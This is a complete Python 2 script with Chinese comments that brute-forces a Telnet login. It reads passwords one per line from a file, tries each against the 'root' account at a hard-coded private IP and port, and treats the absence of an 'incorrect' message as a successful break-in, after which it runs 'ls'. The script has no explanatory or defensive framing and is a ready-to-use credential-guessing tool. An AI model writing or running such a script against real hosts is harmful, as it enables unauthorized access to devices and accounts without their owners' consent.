#!/usr/bin/python
# -*- coding: utf-8 -*-
import telnetlib
import time
import sys
import os

def do_telnet(Host, Port, username, password, errlogin) :
	# 连接Telnet服务器
	tn = telnetlib.Telnet(Host, Port, timeout = 1)
	# tn.set_debuglevel(3)

	# 输入登录用户名
	tn.read_until("login: ")
	tn.write(str(username) + '\n'	)

	# 输入登录密码
	tn.read_until("Password: ")
	tn.write(str(password) + '\n')
	  
	read_ret = tn.read_until(errlogin, 5)
	
	if read_ret.find(errlogin) >= 0 : 
		tn.close()
		return 0
	
	tn.write("ls\n")
	tn.write("exit\n")
	tn.read_all()
	tn.close()
	return 1
	
if __name__ == '__main__' :
	# Host = raw_input("IP:")         # Telnet服务器IP
	# Port = raw_input("Port:")       # Telnet服务器端口
	Host = '192.168.2.27'
	Port = '3232'
	username = 'root'          		  # 登录用户名
	errlogin = 'incorrect'       	  # 密码错误提示
	pw_file = open('passwd.txt','r+') #密码文件
	Index = 0
	print "<----",time.asctime(),"---->"	
	while True:
		Index += 1
		password = pw_file.readline()
		if len(password) == 0 : break
		print Index,time.asctime(),"---",username,":",password
		
		if do_telnet(Host, Port, username, password, errlogin) :
			print "login successfully !"			
		else :
			print "login error !"
			
	pw_file.close()


